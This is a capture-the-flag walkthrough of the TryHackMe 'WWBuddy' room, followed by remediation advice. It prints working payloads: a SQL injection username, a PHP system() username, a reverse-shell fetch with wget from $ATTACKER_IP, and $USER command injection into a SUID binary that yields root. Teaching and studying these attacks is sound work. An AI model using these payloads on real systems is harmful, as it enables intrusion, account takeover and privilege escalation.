@@ -1,0 +1,160 @@
+---
+title: 'WWBuddy'
+description: 'A second-order SQL injection in the username field mass-resets passwords; the same reflected username yields PHP code execution as www-data; a logged password typo and a birthday-based password pivot through users; a SUID binary that runs a command built from $USER gives root.'
+date: 2026-02-26
+platform: tryhackme
+room: 'WWBuddy'
+roomUrl: 'https://tryhackme.com/room/wwbuddy'
+difficulty: medium
+tags:
+  - 'web'
+  - 'php'
+  - 'sql-injection'
+  - 'rce'
+  - 'command-injection'
+  - 'mysql'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'sql injection'
+  - 'authenticated remote code execution'
+  - 'weak credentials'
+  - 'insecure command execution'
+translation: done
+draft: false
+---
+
+_A walkthrough of the "WWBuddy" room from TryHackMe. The username field is the key to everything: it's unvalidated, so it's both a second-order SQL injection (mass password reset) and a PHP code-execution sink. From a www-data shell we pivot through a logged password typo and a birthday-based default, then abuse a SUID binary that builds a shell command from the attacker-controlled_ _`$USER`_ _to reach root._
+
+> WWBuddy is an authorized training challenge on TryHackMe; everything here was performed against a legal practice target. All flags and recovered passwords are shown as `THM{<redacted>}` / `<redacted>` — real on the box, withheld here.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Sign up on the WWBuddy chat app → the **username field is never validated**, so set it to a SQLi payload and the change-password flow runs a `WHERE username = '...'` query that **resets every user's password** → log in as other users, read a chat hinting default passwords are birthdays → the same reflected username on `/admin` evaluates PHP, so a `<?php system(...) ?>` username gives **code execution as www-data** (+ a flag) and a reverse shell → a MySQL `general.log` leaks a password typed into the username field (**roberto**) → a note reveals a coworker's birthday, which is **jenny**'s SSH password → SUID `/bin/authenticate` runs `usermod -G developer $USER` via `system()`, so `export USER=';cp /bin/bash /a;'` + `chmod 4755` yields a **SUID root bash** (root flag).
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-ip>
+```
+
+`nmap` shows SSH and an Apache/PHP login app whose `PHPSESSID` lacks `HttpOnly`:
+
+```text
+22/tcp open  ssh   OpenSSH 7.6p1 Ubuntu
+80/tcp open  http  Apache 2.4.29   # WWBuddy - Login (PHPSESSID httponly not set)
+```
+
+Register an account and explore — it's a chat app with a default `wwbuddy` bot friend. `gobuster` reveals `/admin` (forbidden to normal users), `/api`, `/change`, `/profile`, `/register`.
+
+### **The vulnerability**
+
+SQLMap finds nothing on the obvious inputs, because the flaw is **second-order**: the `username` field has no validation, and the backend trusts it in later queries and in a page that renders it. One unchecked field is therefore two separate bugs.
+
+<Callout type="insight">
+
+Set your username to `admin' or 1 = 1 -- -` and then use **Change Password**. The password-change query is roughly `... WHERE username = '<your username>'`, so the injection makes it match **every row** — a mass password reset for all users, not just you. The _same_ unvalidated username is later reflected into a PHP context on `/admin`, so a username of `<?php system('id') ?>` is executed server-side. Validate a field once, or pay for it everywhere it's used.
+
+</Callout>
+
+### **Step 1 — second-order SQLi → reset everyone's password**
+
+Change your username to a SQLi payload, then run the change-password flow with a new password. Because the query matches all rows, every account (including `wwbuddy`, `henry`, `roberto`) now shares that password. Log in as `wwbuddy`, then `henry`:
+
+```text
+# username set to:  admin' or 1 = 1 -- -
+# then Change Password -> all users now have your chosen password
+```
+
+`henry`'s chats reveal that new employees' default passwords are their **date of birth** (mm/dd/yyyy) — note that for later.
+
+### **Step 2 — reflected username → PHP RCE as www-data (flag)**
+
+The `/admin` log page reflects the username without encoding and evaluates it as PHP. Set the username to a PHP one-liner and reload `/admin` as `henry`:
+
+```text
+# username:  <?php system('id') ?>
+# /admin reflects: uid=33(www-data) gid=33(www-data) ...   + <!-- THM{<redacted>} -->
+```
+
+Due to a username length limit, stage a reverse shell in two steps — first fetch it, then execute:
+
+```text
+# username:  <?php system('wget $ATTACKER_IP/shell.sh') ?>
+# then a username that runs it -> nc -lvnp 4444 catches www-data
+www-data@wwbuddy:/var/www/html/admin$
+```
+
+### **Step 3 — pivot to roberto, then jenny**
+
+`config.php` has the DB creds (`root` / a weak password) but MySQL holds nothing new. The MySQL `general.log`, however, caught a password typed into the username field:
+
+```text
+www-data@wwbuddy:/var/log$ grep -Ri password mysql/general.log
+# ... username = 'Roberto<redacted>'   <- roberto's password, mistyped into the username
+su roberto   # -> roberto
+```
+
+`roberto`'s `importante.txt` (Portuguese) carries a flag and a hint: a coworker, **jenny**, turns 26 “next week”, and the file is dated 07/27/2020 — so her birthday (the default password) is 08/03/1994:
+
+```text
+roberto@wwbuddy:~$ cat importante.txt   # THM{<redacted>} + birthday hint
+ssh jenny@$IP   # password = <redacted birthday, mm/dd/yyyy>
+```
+
+### **Step 4 — SUID authenticate + $USER injection → root (root flag)**
+
+`jenny` can't sudo, but a SUID binary `/bin/authenticate` stands out. Decompiling it (Ghidra) shows it `setuid(0)` then builds a shell command from the **`USER`** **environment variable** and passes it to `system()`:
+
+```text
+setuid(0);
+strncpy(cmd, "usermod -G developer ", ...);
+strncat(cmd, getenv("USER"), ...);
+system(cmd);   // $USER is attacker-controlled
+```
+
+So we inject commands through `$USER`. Length is limited, so copy bash to a short path and SUID it:
+
+```text
+jenny@wwbuddy:~$ export USER=';cp /bin/bash /a;'
+jenny@wwbuddy:~$ /bin/authenticate        # runs: usermod ... ; cp /bin/bash /a ;
+jenny@wwbuddy:~$ export USER=';chmod 4755 /a;'
+jenny@wwbuddy:~$ /bin/authenticate        # /a is now SUID root
+jenny@wwbuddy:~$ /a -p                     # whoami -> root
+# cat /root/root.txt -> THM{<redacted>}
+```
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 \~9.8** (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`). One unvalidated username is both a second-order SQL injection (mass password reset of all accounts) and a PHP code-execution sink (RCE as www-data). Weak/guessable credentials (a logged password typo, a birthday-based default) walk between users, and a SUID binary that executes a command built from `$USER` escalates to full root — complete host and application compromise.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+- **Validate and parameterise.** Treat the username like any input: strict allow-list, parameterised queries, and output-encode it wherever it's rendered. Never evaluate stored fields as code.
+- **Don't log credentials.** MySQL `general.log` captured a password; disable verbose query logging in production and protect log files.
+- **Ban predictable passwords.** A date-of-birth default is trivially guessed; enforce strong, unique passwords and rotate on first login.
+- **Fix the SUID binary.** A root-privileged program must never build a shell command from environment variables; use `execve` with a fixed argument vector and drop privileges early.
+
+</Callout>
+
+### **Takeaways**
+
+- **One field, two classes of bug.** The unvalidated username was both SQLi and RCE — validate at the source, not per-sink.
+- **Second-order injection hides from SQLMap.** The payload lands in storage and fires later; test stored values, not just immediate responses.
+- **Logs leak secrets.** A mistyped password in `general.log` was the whole pivot.
+- **`$USER`** **into** **`system()`** **is command injection.** Any environment variable an attacker controls is untrusted input to a privileged process.
+
+WWBuddy is a sharp reminder that a single unvalidated field can be the entire kill chain. Thanks for reading.
